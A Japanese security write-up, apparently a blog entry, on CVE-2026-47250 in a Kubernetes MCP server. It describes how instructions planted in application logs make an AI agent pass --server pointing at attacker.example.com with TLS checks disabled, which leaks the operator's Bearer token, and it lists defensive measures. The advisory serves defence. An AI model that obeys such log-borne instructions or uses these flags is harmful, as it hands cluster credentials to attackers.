2026-07-09 Security importance: high
Summary

Kubernetes操作用MCPサーバーのCVE-2026-47250は、ログ経由の間接プロンプト注入がkubectlフラグ注入と結びつき、運用者のBearer tokenを外部へ送らせる問題。AIエージェントに本番権限を渡す時の境界設計を見直す材料になる。

Kubernetes MCPトークン漏えい

要約

mcp-server-kubernetes の kubectl_generic tool に、任意の kubectl フラグをそのまま渡せる問題が登録された。CVE-2026-47250 / GHSA-6mx4-4h42-r8vh として公開され、3.7.0で修正済み。

攻撃の形が重要で、単なるコマンド引数検証漏れではない。限定権限の攻撃者がアプリケーションログに構造化された指示を仕込み、運用者が高権限の kubeconfig を持つAIエージェントでログを読ませる。エージェントがその指示に従って kubectl_generic を呼び、--server=https://attacker.example.com と --insecure-skip-tls-verify=true を渡すと、kubectl が運用者の Authorization: Bearer <token> を攻撃者側HTTPSサーバーへ送ってしまう。

つまり、MCP、Kubernetes、間接プロンプト注入、CLIフラグ注入、運用者権限が一本の攻撃チェーンになる。AIエージェントを「kubectlを便利に呼ぶラッパー」として扱うだけでは足りず、エージェントに読ませるログやツール引数も本番権限の境界として扱う必要がある。

背景

MCPはLLMやエージェントから外部ツールを呼ぶための標準的な接続層として広がっている。Kubernetes向けMCPサーバーは、自然言語の運用依頼からPodやログ、リソース状態を調べる用途と相性がよい。

一方で、Kubernetes操作は認証情報の価値が高い。運用者の kubeconfig やサービスアカウントトークンが外部に出ると、そのRBAC範囲でクラスタを直接操作される。今回の問題は、AIエージェントが「ログを読む」だけのつもりでも、ログ内の指示がツール実行に変換されると、認証情報の送信先まで変えられる点を示している。

何が重要か

観点内容見直すべき点
脆弱性kubectl_generic がユーザー指定フラグをallowlistなしで kubectl に渡す汎用実行ツールの引数をdenylistではなくallowlistで絞る
攻撃入口アプリケーションログに置かれた構造化JSONや指示文ログ、Issue、PR、チケットを信頼済み指示として扱わない
権限運用者の高権限 kubeconfig が使われるエージェント専用IDと最小RBACを使う
影響Bearer tokenが攻撃者のHTTPSエンドポイントへ送信される外向き通信、API server指定、TLS検証無効化を監視する
修正mcp-server-kubernetes 3.7.0で対策済み利用バージョン確認とツール呼び出しログの点検

この件で特に見るべきなのは、脆弱性が「AIモデルの幻覚」ではなく、通常のCLI仕様とMCPツール設計の組み合わせから生まれていること。kubectl の --server や --insecure-skip-tls-verify はデバッグや特殊環境では正当なフラグだが、エージェント経由で任意に渡せると認証情報の送信先を変える武器になる。

MicrosoftのAIエージェント防御記事でも、読むだけのAIから実行するAIへ移ると、MCP tool metadataや外部ツールがサプライチェーン境界になると整理されている。今回のCVEは、その抽象論がKubernetes運用の具体的なトークン漏えいに落ちた例として読める。

自分向けメモ

  • Kubernetesやクラウド操作をMCP化するときは、「このツールが呼べるCLIサブコマンド」ではなく「このエージェントに許す業務操作」からAPIを設計する。
  • kubectl の汎用ラッパーは便利だが、本番運用エージェントでは危険。get pods、describe deployment、logs --tail のように用途別ツールへ分け、危険フラグを構造上受け付けない形がよい。
  • ログ確認エージェントには、ログ本文を命令ではなくデータとして扱うプロンプトだけでなく、ツール層の制約が必要。プロンプトだけで守る設計にしない。
  • 外向き通信の観測では、Kubernetes API server以外へ kubectl 由来のAuthorization headerが出ていないかを見る。特に --server とTLS検証無効化の組み合わせはアラート候補。
  • OpenClawやCodex系の個人環境でも、ローカルMCPに強い認証情報を渡す場合は同じ問題が起きる。便利な万能toolは、権限の高い環境ほど分割する。
